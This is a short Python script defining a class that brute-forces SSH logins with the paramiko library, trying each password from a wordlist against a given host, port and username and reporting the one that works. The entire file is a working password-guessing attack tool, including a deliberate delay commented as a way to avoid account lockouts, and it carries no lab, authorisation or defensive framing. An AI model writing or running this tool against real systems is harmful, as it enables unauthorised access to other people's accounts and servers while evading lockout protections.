import paramiko
import time

class BruteForcer:
    def __init__(self, target_ip, username, wordlist_path, port=22):
        self.target_ip = target_ip
        self.username = username
        self.wordlist_path = wordlist_path
        self.port = port

    def brute_force(self):
        print(f"Starting brute-force on {self.target_ip}:{self.port} for user '{self.username}'...")
        try:
            with open(self.wordlist_path, 'r') as file:
                passwords = file.read().splitlines()
        except FileNotFoundError:
            print("Wordlist file not found!")
            return None

        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.target_ip, port=self.port, username=self.username, password=password, timeout=5)
                print(f"Success! Password found: {password}")
                ssh.close()
                return password
            except paramiko.AuthenticationException:
                print(f"Failed: {password}")
            except Exception as e:
                print(f"Error: {e}")
            time.sleep(1)  # Delay to avoid lockouts
        print("Brute-force complete. No password found.")
        return None